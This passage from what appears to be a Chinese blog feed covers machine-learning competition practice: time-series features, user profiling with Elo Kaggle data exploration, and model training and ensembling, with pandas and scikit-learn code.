    <content type="html"><![CDATA[<h1 id="时间序列">时间序列</h1><h2 id="什么是时间按序列">什么是时间按序列</h2><p>时间序列是按时间按顺序索引的一系列数据点，因此，组成时间序列的数据由相对确定的时间戳组成，与随机样本数据相比，从时间序列数据中能够提取更多的附加信息。</p><p>从变量角度可以将这些变量归纳为<strong>单变量时间序列</strong>和多变量时间序列，其次可以从预测目标角度将这些问题归纳为<strong>单步预测</strong>和<strong>多步预测</strong>。</p><h3 id="交叉验证">交叉验证</h3><p>由于时间序列中包含时间结构，因此一般在保留这种结构的同时要注意不能在折叠中出现数据穿越的情况。如果进行随机化的交叉验证，那么标签值之间的所有的时间相关性都将丢失，并且会导致数据穿越。</p><span id="more"></span><p>我们首先用初始时间到t时刻的数据来训练模型，然后从t到t+n的时刻进行线下验证，并计算评价指标的分数；接下来，将训练样本扩展到t+n时刻，用t+n到t+2n时刻的数据进行验证，不断重复这个过程，直到达最后一个可用的标签值。验证次数可以自由控制，最后对多次验证结果计算平均值得到最终的线下验证结果。</p><h3 id="基本规则方法">基本规则方法</h3><ul><li><p>加权平均 <span class="math display">\[y_t=\frac{1}{N}{(w_1*y_{t-1}+w_2*y_{t-2}+\dots+w_N*y_{t-N}}\]</span></p></li><li><p>指数平滑 <span class="math display">\[y_i=a\sum_{n=0}^{t}{1-a}y_{t-n}\]</span></p></li></ul><h2 id="时间序列模式">时间序列模式</h2><ul><li>趋势性</li><li>周期性</li><li>相关性</li><li>随机性</li></ul><h2 id="特征提取方式">特征提取方式</h2><h3 id="历史平移">历史平移</h3><p>时间序列数据存在者前后关系，时间序列中越是相近的标签，其相关性越高。我们可以借助这个特性构造历史平移特征，即直接将历史记录作为特征。具体的，如果当前时刻为t，那么可以将t-1,t-2,...,t-n时刻的值作为特征，这个值可以是标签值，也可以是与标签值存在关联性的值。</p><h3 id="窗口统计">窗口统计</h3><p>不同于历史平移从单个序列单位中提取特征，窗口统计是从多个序列单位中提取特征。窗口统计可以反应区间内序列数据的状况。</p><h3 id="序列熵特征">序列熵特征</h3><p>在时间序列中，熵可以用来描述序列的确定性与不确定性。</p><h1id="实战案例全球城市计算ai挑战赛">实战案例：全球城市计算AI挑战赛</h1><p><ahref="https://tianchi.aliyun.com/competition/entrance/231708/introduction">全球城市计算AI挑战赛-天池大赛-阿里云天池(aliyun.com)</a></p><h1 id="赛题理解">赛题理解</h1><h2 id="赛题faq">赛题FAQ</h2><p><strong>Q:</strong>本次竞赛的标签需要自己构建，如何建模能使我们在给定的数据集上达到尽可能大的预测性？</p><p><strong>A:</strong>构建地铁站的流量标签是本次竞赛的首要任务。在初次观察数据后，会发现存在或多或少的问题，比如出现了凌晨进出地铁站流量不为0的记录，不同地铁站的数据存在一定的差异性。为了保证结果的稳定性，获取可以尝试对进出地铁站的流量按地铁站进行处理(归一化，标准化等)</p><p><strong>Q:</strong>地铁站的流量存在太多影响因素，应该如何处理异常值，保证模型稳定？</p><p><strong>A:</strong>特殊因素带来的影响非常多，针对这类问题，常见的方法有异常去除，异常标记和异常平滑。</p><h3 id="baseline方案">Baseline方案</h3><ul><li>数据准备</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> lightgbm <span class="hljs-keyword">as</span> lgb<br><br><span class="hljs-comment">#读取数据</span><br>path = <span class="hljs-string">&#x27;./input/&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">26</span>)):<br>    <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">10</span>:<br>        train_tmp = pd.read_csv(path + <span class="hljs-string">&#x27;Metro_train/record_2019-01-0&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.csv&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>        train_tmp = pd.read_csv(path + <span class="hljs-string">&#x27;Metro_train/record_2019-01-&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.csv&#x27;</span>)<br><span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span>:<br>        <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>竞赛实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习算法竞赛实战(四)</title>
    <link href="/2021/10/23/ML-Pratice/ML-Algorithm-pratice-4/"/>
    <url>/2021/10/23/ML-Pratice/ML-Algorithm-pratice-4/</url>
    
    <content type="html"><![CDATA[<h1 id="用户画像">用户画像</h1><h2 id="什么是用户画像">什么是用户画像</h2><p>在机器学习中提到的用户画像通常是基于给定的数据对用户属性以及行为进行描述，然后提取用户的个性化指标，再以此分析可能存在的群体共性，并落地应用到各种业务场景中。</p><h2 id="标签系统">标签系统</h2><h3 id="标签分类方式">标签分类方式</h3><ul><li>用户属性</li><li>用户标签</li><li>标签属性</li><li>类目标签</li></ul><span id="more"></span><h3 id="多渠道获取标签">多渠道获取标签</h3><ul><li>事实类标签</li><li>规则类标签</li><li>模型类标签</li></ul><h2 id="用户画像数据特征">用户画像数据特征</h2><h3 id="常见的数据形式">常见的数据形式</h3><ul><li>数值型变量。年龄，身高，体重等。</li><li>类别型变量。性别，籍贯，所在城市等。</li><li>多值型变量。兴趣爱好，穿衣风格等</li><li>文本型变量。</li></ul><h3 id="文本挖掘算法">文本挖掘算法</h3><ul><li>LSA</li><li>PLSA</li><li>LDA</li></ul><h3 id="相似度计算方法">相似度计算方法</h3><ul><li><p>欧式距离 <span class="math display">\[d(A, B) = \sqrt{\sum_{i=1}^n{(a_i,b_i)^2}}\]</span></p></li><li><p>余弦相似度 <span class="math display">\[\cos\theta=\frac{\sum_{i=1}^{n}{(a_i*b_i)}}{\sqrt{\sum_{i=1}^{n}a_i^2}*\sqrt{\sum_{i=1}^{n}b_i^2}}\]</span></p></li><li><p>Jaccard相似度 <span class="math display">\[J(C,D)=\frac{|C\bigcap{D}|}{|C\bigcup{D}|}=\frac{|C\bigcap{D}|}{|C|+|D|-|C\bigcap{D}|}\]</span></p></li></ul><h1 id="实战案例elo-merchant-category-recommendtion">实战案例：EloMerchant Category Recommendtion</h1><p><ahref="https://www.kaggle.com/c/elo-merchant-category-recommendation">EloMerchant Category Recommendation | Kaggle</a></p><h2 id="赛题理解">赛题理解</h2><h3 id="赛题背景">赛题背景</h3><p>Elo是巴西最大的支付品牌，Elo建立了机器学习模型，以了解顾客生命周期中从视频到购物等最重要方面的偏好。</p><h3 id="赛题数据">赛题数据</h3><ul><li>train.csv：训练集</li><li>test.csv：测试集</li><li>sample_submission.csv：正确与规范的提交文件示例</li><li>historical_transactions.csv：信用卡的历史交易记录</li><li>merchants.csv：数据集中所有商家的附加信息</li><li>new_merchant_transactions.csv：每张信用卡在新商家的购物数据，最多包含两个月的数据</li><li>Data_Dictionary.xlsx:数据字典的说明文件</li></ul><h3 id="赛题任务">赛题任务</h3><p>通过顾客的历史交易记录以及顾客和商家的信息数据进行模型训练，最终预测测试集里面所有信用卡的忠诚度分数。</p><h3 id="评价指标">评价指标</h3><p>本次竞赛采用均方根误差(RMSE)作为评价指标<spanclass="math inline">\(RMSE=\sqrt{\frac{1}{n}\sum_{i=1}^{n}{(y_i-y_i&#39;)^2}}\)</span></p><p>其中<spanclass="math inline">\(y_i&#39;\)</span>是参赛者对每个信用卡预测的忠诚度分数，而<spanclass="math inline">\(y_i\)</span>是对应信用卡的真实忠诚度分数。</p><h2 id="数据探索">数据探索</h2><p>"Talk is cheap,show me the data."</p><h3 id="字段类别含义">字段类别含义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 查看训练集与测试集字段的含义</span><br>df = pd.read_excel(datapath+<span class="hljs-string">&#x27;Data_Dictionary.xlsx&#x27;</span>, sheet_name=<span class="hljs-string">&#x27;train&#x27;</span>, skiprows=<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> va <span class="hljs-keyword">in</span> df.values:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Column:&#x27;</span>, va[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;Description:&#x27;</span>, va[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><img src="/2021/10/23/ML-Pratice/ML-Algorithm-pratice-4/image-20211023155726791.png" class="" title="train字段"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 查看history_transactions.csv字段的含义</span><br>df2 = pd.read_excel(datapath+<span class="hljs-string">&#x27;Data_Dictionary.xlsx&#x27;</span>, sheet_name=<span class="hljs-string">&#x27;history&#x27;</span>, skiprows=<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> va <span class="hljs-keyword">in</span> df.values:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Column:&#x27;</span>, va[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;Description:&#x27;</span>, va[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><img src="/2021/10/23/ML-Pratice/ML-Algorithm-pratice-4/image-20211023160440976.png" class="" title="hstory字段"><h3 id="数据分布差异">数据分布差异</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 以first_active_month为例分析训练集与测试集的差异</span><br>features = [<span class="hljs-string">&#x27;first_active_month&#x27;</span>,<span class="hljs-string">&#x27;feature_1&#x27;</span>,<span class="hljs-string">&#x27;feature_2&#x27;</span>,<span class="hljs-string">&#x27;feature_3&#x27;</span>]<br>train_count = train.shape[<span class="hljs-number">0</span>]<br>test_count = test.shape[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> feature <span class="hljs-keyword">in</span> features:<br>    train[feature].value_counts().sort_index().plot()<br>    test[feature].value_counts().sort_index().plot()<br>    plt.xlabel(feature)<br>    plt.legend([<span class="hljs-string">&#x27;train&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>])<br>    plt.ylabel(<span class="hljs-string">&#x27;count&#x27;</span>)<br>    plt.show()<br><span class="hljs-comment">#结论：训练集与测试集在所有单变量上的绝对数量分布形状极其相似，需要进一步查看相对占比分布</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 以first_active_month为例分析训练集与测试集的差异</span><br>features = [<span class="hljs-string">&#x27;first_active_month&#x27;</span>,<span class="hljs-string">&#x27;feature_1&#x27;</span>,<span class="hljs-string">&#x27;feature_2&#x27;</span>,<span class="hljs-string">&#x27;feature_3&#x27;</span>]<br>train_count = train.shape[<span class="hljs-number">0</span>]<br>test_count = test.shape[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> feature <span class="hljs-keyword">in</span> features:<br>    (train[feature].value_counts().sort_index()/train_count).plot()<br>    (test[feature].value_counts().sort_index()/test_count).plot()<br>    plt.legend([<span class="hljs-string">&#x27;train&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>])<br>    plt.xlabel(feature)<br>    plt.ylabel(<span class="hljs-string">&#x27;ratio&#x27;</span>)<br>    plt.show()<br><br><br><span class="hljs-comment">#结论：训练集与测试集在所有单变量上的相对占比分布形状基本一致，猜想训练集与测试集的生成方式</span><br><span class="hljs-comment"># 一样，继续验证联合分布以加强猜想的事实依据</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 为了查看多变量的联合分布，通常来说可以使用散点图，但这里的四个特征均是离散特征，因此散点图不太适合</span><br><span class="hljs-comment"># 继续延续上面画单变量图的思想，参赛者可以通过将两个变量拼到一起转变为单变量的分布</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">combine_feature</span>(<span class="hljs-params">df</span>):<br>    cols = df.columns<br>    feature1 = df[cols[<span class="hljs-number">0</span>]].astype(<span class="hljs-built_in">str</span>).values.tolist()<br>    feature2 = df[cols[<span class="hljs-number">1</span>]].astype(<span class="hljs-built_in">str</span>).values.tolist()<br>    <span class="hljs-keyword">return</span> pd.Series([feature1[i]+<span class="hljs-string">&#x27;&amp;&#x27;</span>+feature2[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(df.shape[<span class="hljs-number">0</span>])])<br>n = <span class="hljs-built_in">len</span>(features)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">1</span>, n):<br>        cols = [features[i], features[j]]<br>        <span class="hljs-built_in">print</span>(cols)<br>        train_dis = combine_feature(train[cols]).value_counts().sort_index()/train_count<br>        test_dis = combine_feature(test[cols]).value_counts().sort_index()/test_count<br>        index_dis = pd.Series(train_dis.index.tolist() + test_dis.index.tolist()).drop_duplicates().sort_values()<br>        (index_dis.<span class="hljs-built_in">map</span>(train_dis).fillna(<span class="hljs-number">0</span>)).plot()<br>        (index_dis.<span class="hljs-built_in">map</span>(train_dis).fillna(<span class="hljs-number">0</span>)).plot()<br>        plt.legend([<span class="hljs-string">&#x27;train&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>])<br>        plt.xlabel(<span class="hljs-string">&#x27;&amp;&#x27;</span>.join(cols))<br>        plt.ylabel(<span class="hljs-string">&#x27;ratio&#x27;</span>)<br>        plt.show()<br><span class="hljs-comment"># 结论：修正上述遗漏后参赛者可以发现训练集与测试集的两变量联合分布也基本保持一致，由此基本可以判定，训练集与测似集</span><br><span class="hljs-comment"># 的生成方式基本一摸一样，即测试集与训练集是同一批数据随机划分后的结果，有兴趣的参赛者可继续验证三变量和四变量分布。假定</span><br><span class="hljs-comment"># 关于验证集与测试集的这一猜想成立，会极大地增添参赛者后续进行特征工程的信心，对建模方式也会有一个整体把握。</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>竞赛实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习算法竞赛实战(三)</title>
    <link href="/2021/10/22/ML-Pratice/ML-Algorithm-pratice-3/"/>
    <url>/2021/10/22/ML-Pratice/ML-Algorithm-pratice-3/</url>
    
    <content type="html"><![CDATA[<h1 id="模型训练">模型训练</h1><h2 id="线性模型">线性模型</h2><h3 id="lasso回归">Lasso回归</h3><p>Least absolute shrinkage and selectionoperator，是对普通的线性回归使用L1正则进行优化。 <spanclass="math display">\[\min{||Y-X\theta||_2^2 + \lambda||\theta||_1}\]</span></p><p>其中，(惩罚项)的系数，通过改变，基本上可以控制惩罚项。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> sklearn.linear_model import Lasso<br>lasso_model = Lasso(<span class="hljs-attribute">alpha</span>=0.1, <span class="hljs-attribute">normalize</span>=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h3 id="ridge回归">Ridge回归</h3><p>Ridge回归是对普通的线性回归使用L2正则进行优化，对特征的权重系数设置了惩罚项。</p><span id="more"></span><p><span class="math display">\[\min{||Y-X\theta||_2^2 + \lambda||\theta||_2^2}\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> Ridge<br>Ridge_model = Ridge(alpha=<span class="hljs-number">0.05</span>, normalize=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>面对非常大的数据集时，若使用Lasso回归进行训练，当存在相关的特征时，Lasso只保留其中的一个特征，而将其他的特征设置为零，这会导致一些信息丢失，从而降低模型的准确性。若使用Ridge回归，虽然能降低模型的负责性，但并不会减少特征的数量，模型可能会很复杂，因此可能会导致模型性能不佳。</p><h2 id="树模型">树模型</h2><ul><li>随机森林(Random Forest，RF)</li><li>梯度提升树(GBDT)</li></ul><h3 id="随机森林">随机森林</h3><p>随即森林算法就是通过集成学习的思想将多个决策树集成在一起。</p><p><strong>构造过程</strong></p><ol type="1"><li>随机抽样，训练决策树</li><li>随机选取属性做节点分裂属性</li><li>重复步骤2直到不能再分裂</li><li>建立大量决策树形成森林</li></ol><p><strong>优缺点</strong></p><p>随机森林的优点非常明显：不仅可以解决分类和回归问题，还可以同时处理类别特征和数值特征，不容易过拟合，非常稳定。</p><p>随机森林计算更加复杂。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier<br>rf = RandomForestClassifier(max_features=<span class="hljs-string">&#x27;auto&#x27;</span>, obb_score=<span class="hljs-literal">True</span>, random_state=<span class="hljs-number">1</span>, n_jobs=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="梯度提升树">梯度提升树</h3><p>梯度提升树(GBDT)是基于Boosting改进而得的。</p><h3 id="xgboost">XGBoost</h3><ul><li>采用稀疏感知算法</li><li>近似数学习</li><li>并行计算，分布式计算</li><li>核外计算</li><li>有效地处理缺失值</li></ul><h3 id="lightgbm">LightGBM</h3><ul><li>比XGBoost准确性更高，训练时间更短</li><li>支持并行树增强</li><li>将连续特征提取为离散特征</li><li>通过使用按叶分割而不是按级别分割来获得更高精度，加快目标函数的收敛过程，并在非常复杂的树捕获训练数据的底层模式。</li></ul><h3 id="catboost">CatBoost</h3><ul><li>支持类别特征</li><li>提出一种全新的梯度提升机制(OrderedBoosting)，不仅可以减少过拟合的风险，也大大提高了准确性</li><li>支持开箱即用的GPU训练</li><li>训练中使用了组合类别特征，利用特征之间的联系，极大丰富了特征维度。</li></ul><h2 id="神经网络">神经网络</h2><h3 id="多层感知机">多层感知机</h3><p>多层感知机(MLP)也可以称作深度神经网络(Deep Neural Networks,DNN)。</p><ul><li>权重与偏置。</li><li>激活函数</li></ul><h3 id="卷积神经网络">卷积神经网络</h3><ul><li>能够有效地将大数据量的图片降维成小数据量，简化复杂问题</li><li>能够有效保留图像特征，并且符合图像处理的原则。</li></ul><h3 id="循环神经网络">循环神经网络</h3><p>循环神经网络(RNN)是神经网络的一种扩展，更擅长对序列数据进行建模处理。</p><h1 id="模型融合">模型融合</h1><h2 id="构建多样性">构建多样性</h2><h3 id="特征多样性">特征多样性</h3><p>构建多个有差异的特征集并分别建立模型，可以使特征存在于不同的超空间，从而建立的多个模型有不同的泛化误差，最终模型融合时可以起到互补的效果。</p><h3 id="样本多样性">样本多样性</h3><p>具体做法是将数据集切分成多份，然后分别建立模型。很多树模型在训练的时候会进行采样，主要目的是防止过拟合，从而提升预测的准确性。</p><h3 id="模型多样性">模型多样性</h3><p>不同模型对数据的表达能力是不同的。</p><h2 id="训练模型融合">训练模型融合</h2><h3 id="bagging">Bagging</h3><p>Bagging的思想很简答，即从训练集中有返回地取出数据(Bootstraping)，这些数据构成样本集，然后用样本训练弱分类器。重复上述过程多次，取平均值或者采用投票机制得到模型融合的最终结果。</p><h3 id="boosting">Boosting</h3><p>首先训练一个弱分类器，并把这个弱分类器分错类的样本记录下来，同时给予这个弱分类器一定的权重；然后建立一个新的弱分类器，新的弱分类器基于前面记录的错误样本进行训练，同时，我们也给予这个分类器一个权重。</p><h2 id="训练结果融合">训练结果融合</h2><h3 id="加权法">加权法</h3><ul><li><p>分类问题</p><p>投票法。</p></li><li><p>回归问题</p></li><li><p>排序问题</p></li></ul><h3 id="stacking">Stacking</h3><p>通过新的模型来学习每个分类器的权重。</p><ul><li>构建的新模型一般是简单模型</li><li>使用多个模型进行Stacking融合会有比较好的效果。</li></ul><h3 id="blending">Blending</h3><p>Blending融合是建立一个Holdout集,将不相交的数据集用于不同层的训练，这样可以很大程度上降低过拟合的风险。</p><p>假设我们构造两层Blending，将训练及按5:5的比例分为两部分(train_one和train_two)，测试集为test</p><p>第一层用train_one训练多个模型，将此模型对train_two和test的预测结果合并到原始特征集中，作为第二层的特征集。第二层用train_two的特征集和标签训练新的模型，然后对test预测得到最终的融合结果。</p><h2 id="实战案例">实战案例</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-title">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> KFold<br><span class="hljs-title">from</span> sklearn.metrics <span class="hljs-keyword">import</span> mean_squared_error<br><span class="hljs-title">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> OneHotEncoder<br><span class="hljs-keyword">import</span> lightgbm <span class="hljs-keyword">as</span> lgb<br><br><span class="hljs-title">from</span> matplotlib <span class="hljs-keyword">import</span> colors <br><span class="hljs-title">from</span> matplotlib.ticker <span class="hljs-keyword">import</span> PercentFormatter <br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> warnings<br><span class="hljs-title">warnings</span>.filterwarnings(&#x27;ignore&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">train = pd.read_csv(<span class="hljs-string">&#x27;train.csv&#x27;</span>)<br>test = pd.read_csv(<span class="hljs-string">&#x27;test.csv&#x27;</span>)<br><br>all_data = pd.concat((train,test))<br>all_data = pd.get_dummies(all_data)<br><span class="hljs-comment"># 填充缺失值</span><br>all_data = all_data.fillna(all_data.mean())<br><span class="hljs-comment"># 数据切分</span><br>x_train = all_data[:train.shape[<span class="hljs-number">0</span>]]<br>x_test = all_data[train.shape[<span class="hljs-number">0</span>]:]<br>y_train = train.SalePrice<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> ExtraTreesRegressor<br><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestRegressor<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> mean_squared_error<br><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> Ridge, Lasso<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sqrt  <br><span class="hljs-comment"># 依然采用5折交叉验证 </span><br>kf = KFold(n_splits=<span class="hljs-number">5</span>, shuffle=<span class="hljs-literal">True</span>, random_state=<span class="hljs-number">2020</span>)                                                                           <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SklearnWrapper</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, clf, seed=<span class="hljs-number">0</span>, params=<span class="hljs-literal">None</span></span>):<br>        params[<span class="hljs-string">&#x27;random_state&#x27;</span>] = seed<br>        self.clf = clf(**params)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">train</span>(<span class="hljs-params">self, x_train, y_train</span>):<br>        self.clf.fit(x_train, y_train)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">predict</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-keyword">return</span> self.clf.predict(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_oof</span>(<span class="hljs-params">clf</span>):<br>    oof_train = np.zeros((x_train.shape[<span class="hljs-number">0</span>],))<br>    oof_test = np.zeros((x_test.shape[<span class="hljs-number">0</span>],))<br>    oof_test_skf = np.empty((<span class="hljs-number">5</span>, x_test.shape[<span class="hljs-number">0</span>]))<br>    <br>    <span class="hljs-keyword">for</span> i, (train_index, valid_index) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(kf.split(x_train, y_train)):<br>        trn_x, trn_y, val_x, val_y = x_train.iloc[train_index], y_train[train_index],\<br>            x_train.iloc[valid_index], y_train[valid_index]<br>        clf.train(trn_x, trn_y)<br><br>        oof_train[valid_index] = clf.predict(val_x)<br>        oof_test_skf[i, :] = clf.predict(x_test)<br><br>    oof_test[:] = oof_test_skf.mean(axis=<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> oof_train.reshape(-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>), oof_test.reshape(-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">et_params = &#123;<br>   <span class="hljs-string">&#x27;n_estimators&#x27;</span>: <span class="hljs-number">100</span>,<br>    <span class="hljs-string">&#x27;max_features&#x27;</span>: <span class="hljs-number">0.5</span>,<br>    <span class="hljs-string">&#x27;max_depth&#x27;</span>: <span class="hljs-number">12</span>,<br>    <span class="hljs-string">&#x27;min_samples_leaf&#x27;</span>: <span class="hljs-number">2</span>,<br>&#125;<br>rf_params = &#123;<br>    <span class="hljs-string">&#x27;n_estimators&#x27;</span>: <span class="hljs-number">100</span>,<br>    <span class="hljs-string">&#x27;max_features&#x27;</span>: <span class="hljs-number">0.2</span>,<br>    <span class="hljs-string">&#x27;max_depth&#x27;</span>: <span class="hljs-number">12</span>,<br>    <span class="hljs-string">&#x27;min_samples_leaf&#x27;</span>: <span class="hljs-number">2</span>,<br>&#125;<br>rd_params=&#123;<span class="hljs-string">&#x27;alpha&#x27;</span>: <span class="hljs-number">10</span>&#125;<br>ls_params=&#123; <span 